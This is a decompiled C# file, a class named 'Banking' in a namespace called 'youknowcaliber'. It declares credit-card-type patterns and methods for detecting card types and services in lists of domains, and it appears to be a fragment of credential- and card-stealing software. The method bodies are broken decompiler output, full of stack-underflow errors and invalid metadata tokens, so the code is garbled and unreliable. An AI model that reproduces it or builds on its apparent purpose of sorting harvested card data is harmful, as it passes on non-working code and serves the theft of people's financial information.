using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace youknowcaliber;

internal sealed class Banking
{
	private static char[] InvalidChars;

	private static Dictionary<string, Regex> CreditCardTypes;

	private static extern bool AppendValue(string value, List<string> domains);

	private static extern void DetectServices(string value, string[] toscan, List<string> detected, bool ondetect);

	public static string DetectCreditCardType(string number)
	{
		//Discarded unreachable code: IL_0007, IL_000c, IL_0012, IL_0018, IL_0021, IL_0026
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Invalid comparison between Unknown and I4
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Incompatible stack heights: 0 vs 1
		checked
		{
			_ = (nint)/*Error near IL_0002: Stack underflow*/;
			/*Error near IL_0002: Invalid metadata token*/;
		}
	}

	public extern Banking();

	static Banking()
	{
		//Discarded unreachable code: IL_0022
		//IL_0011: Invalid comparison between Unknown and I
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected F4, but got Unknown
		checked
		{
			while (true)
			{
				if (/*Error near IL_0007: Stack underflow*/ <= /*Error near IL_0007: Stack underflow*/&& /*Error near IL_000c: Stack underflow*/> /*Error near IL_000c: Stack underflow*/)
				{
					int num = (int)/*Error near IL_000d: Stack underflow*/;
					/*Error near IL_000e: ldloc 2 (out-of-bounds)*/;
					/*Error near IL_000f: stloc 2 (out-of-bounds)*/;
					nint num2 = (nint)unchecked((uint)num);
					if (unchecked((nint)/*Error near IL_0016: Stack underflow*/) < num2 && /*Error near IL_001b: Stack underflow*/<= /*Error near IL_001b: Stack underflow*/)
					{
						break;
					}
				}
			}
			int num3 = (int)/*Error near IL_001c: Stack underflow*/;
			_ = ((IntPtr[])/*Error near IL_001d: Stack underflow*/)[num3];
			/*Error near IL_001d: Invalid metadata token*/;
		}
	}
}
